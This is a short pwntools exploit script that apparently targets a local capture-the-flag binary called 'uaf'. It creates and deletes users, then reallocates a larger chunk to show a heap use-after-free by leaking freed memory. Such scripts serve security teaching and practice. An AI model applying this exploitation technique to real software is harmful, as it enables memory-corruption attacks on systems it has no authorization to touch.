from pwn import *

context.log_level = 'DEBUG'
context.binary = elf = ELF("./uaf")

p = process(elf.path)

def AddUser(name, password, size, intro, motto):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"name > ", name)
    p.sendlineafter(b"password > ", password)
    p.sendlineafter(b"introduction size > ", str(size).encode())
    p.sendlineafter(b"introduction > ", intro)
    p.sendlineafter(b"motto > ", motto)
    p.recvuntil(b"at index ")
    return int(p.recvline().strip())

def DeleteUser(index, password):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"index > ", str(index).encode())
    p.sendlineafter(b"password > ", password)

def ShowUser(index, password):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"index > ", str(index).encode())
    p.sendlineafter(b"password > ", password)
    p.recvuntil(b"user name: ")
    name = p.recv(0x20)
    p.recvuntil(b"user motto: ")
    motto = p.recv(0x20)
    p.recvuntil(b"user intro: ")
    intro = p.recv(0x40)
    return name, motto, intro

def EditUser(index, password, name, intro, motto):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"index > ", str(index).encode())
    p.sendlineafter(b"password > ", password)
    p.sendlineafter(b"new name > ", name)
    p.sendlineafter(b"new introduction > ", intro)
    p.sendlineafter(b"new motto > ", motto)

# Create two users with same intro size
idx1 = AddUser(b"Anyaa", b"Rees", 32, b"!!!!!", b"*****")
idx2 = AddUser(b"Meave", b"Wily", 32, b"?????", b"#####")

# Delete both users
DeleteUser(idx1, b"Rees")
DeleteUser(idx2, b"Wily")

idx3 = AddUser(b"", b"pass", 96, b"", b"")

# Show the user to verify UAF
name, motto, intro = ShowUser(idx3, b"pass")
print(f"UAF result - Name: {name}, Motto: {motto}, Intro: {intro}")

p.interactive()